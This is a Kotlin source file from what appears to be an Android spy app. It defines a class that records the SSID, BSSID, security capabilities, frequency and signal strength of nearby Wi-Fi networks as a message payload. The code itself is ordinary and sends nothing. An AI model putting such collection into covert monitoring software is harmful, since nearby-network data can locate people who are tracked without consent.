package com.komnacki.androidspyapp

import android.content.Context
import android.net.wifi.ScanResult
import android.util.Log

class WifiScanResult(override var context: Context, scanResult: ScanResult?) : Message {
    init {
        getWifiResults (
            scanResult
        )
    }

    private lateinit var info : MutableMap<String, Any>
    private val CAPABILITIES_PROPERTY_NAME = "CAPABILITIES"
    private val SSID_PROPERTY_NAME = "SSID"
    private val BSSID_PROPERTY_NAME = "BSSID"
    private val FREQUENCY_PROPERTY_NAME = "FREQUENCY"
    private val LEVEL_PROPERTY_NAME = "LEVEL"
    private val UNKNOWN_PROPERTY_NAME = "UNKNOWN_"

    private fun getWifiResults(scanResult: ScanResult?) {
        if(scanResult != null) {
            try {
                info = mutableMapOf()
                info[CAPABILITIES_PROPERTY_NAME] = scanResult.capabilities
                info[SSID_PROPERTY_NAME] = scanResult.SSID
                info[BSSID_PROPERTY_NAME] = scanResult.BSSID
                info[FREQUENCY_PROPERTY_NAME] = scanResult.frequency
                info[LEVEL_PROPERTY_NAME] = scanResult.level
            } catch (e: Exception) {
                Log.e("KK: ", "EXCEPTION during save fields for wifi in WifiScanResult: " + e.cause + ", " + e.message)
            }
        } else {
            Log.e("KK: ", "EXCEPTION during save fields for wifi in WifiScanResult: " + "Scan result == null")
        }
    }

    override fun getData(): Map<String, Any> {
        return info
    }

    fun getWifiName() : String {
        val ssid = info[SSID_PROPERTY_NAME]
        return if(ssid != null) {
            val wifiName: String = ssid as String
            if (!wifiName.isBlank()) {
                wifiName
            } else {
                UNKNOWN_PROPERTY_NAME + System.currentTimeMillis()
            }
        } else {
            UNKNOWN_PROPERTY_NAME + System.currentTimeMillis()
        }
    }
}